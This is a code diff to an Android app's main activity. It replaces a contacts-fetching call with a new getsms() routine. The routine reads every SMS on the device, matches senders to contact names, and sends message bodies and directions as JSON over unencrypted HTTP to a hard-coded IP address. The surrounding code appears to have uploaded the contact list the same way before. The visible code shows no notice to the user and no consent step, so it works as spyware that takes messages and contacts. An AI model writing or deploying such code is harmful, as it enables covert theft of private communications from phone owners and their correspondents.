@@ -50,8 +50,13 @@ public class MainActivity extends Activity {
         context = getApplicationContext();
         outputText = (TextView) findViewById(R.id.textView1);
 
-        try {
+        /*try {
             fetchContacts();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }*/
+        try {
+            getsms();
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -61,9 +66,60 @@ public class MainActivity extends Activity {
 
     }
 
-    public void testing() {
+    public void getsms() throws JSONException{
+        Uri uriSMSURI = Uri.parse("content://sms/");
+        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, null);
+        JSONObject parent = new JSONObject();
+        JSONArray messages = new JSONArray();
+        while (cur.moveToNext()) {
+            JSONObject details = new JSONObject();
+            String address = cur.getString(cur.getColumnIndex("address"));
+            String name = getContactName(getApplicationContext(), address);
+            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+            String inttype = cur.getString(cur.getColumnIndexOrThrow("type"));
+
+            if(name == null)
+                details.put("Name", address);
+            else
+                details.put("Name", name);
+
+            details.put("Message", body);
+            if (inttype.equalsIgnoreCase("1")) {
+                String type = "INCOMING";
+                details.put("Type", type);
+            } else if(inttype.equalsIgnoreCase("2")) {
+                String type = "OUTGOING";
+                details.put("Type", type);
+            }
+            messages.put(details);
+        }
+        parent.put("messages", messages);
+        String data = parent.toString();
+        AsyncTaskRunner runner = new AsyncTaskRunner();
+        runner.execute(data);
 
 
+
+    }
+
+    public String getContactName(Context context, String phoneNumber) {
+        ContentResolver cr = context.getContentResolver();
+        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
+                Uri.encode(phoneNumber));
+        Cursor cursor = cr.query(uri,
+                new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
+        if (cursor == null) {
+            return null;
+        }
+        String contactName = null;
+        if (cursor.moveToFirst()) {
+            contactName = cursor.getString(cursor
+                    .getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
+        }
+        if (cursor != null && !cursor.isClosed()) {
+            cursor.close();
+        }
+        return contactName;
     }
 
     public void fetchContacts() throws JSONException {
@@ -215,7 +271,7 @@ public class MainActivity extends Activity {
         protected String doInBackground(String... params) {
             HttpClient httpclient = new DefaultHttpClient();
             HttpPost httppost = new HttpPost(
-                    "http://128.199.179.143/groups/api/addContact");
+                    "http://128.199.179.143/groups/api/addMessage");
             String responseBody = null;
             Log.d("Data", params[0]);
 
@@ -224,7 +280,7 @@ public class MainActivity extends Activity {
                 List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
 
 
-                nameValuePairs.add(new BasicNameValuePair("contacts", params[0]));
+                nameValuePairs.add(new BasicNameValuePair("Messages", params[0]));
 
 
                 httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
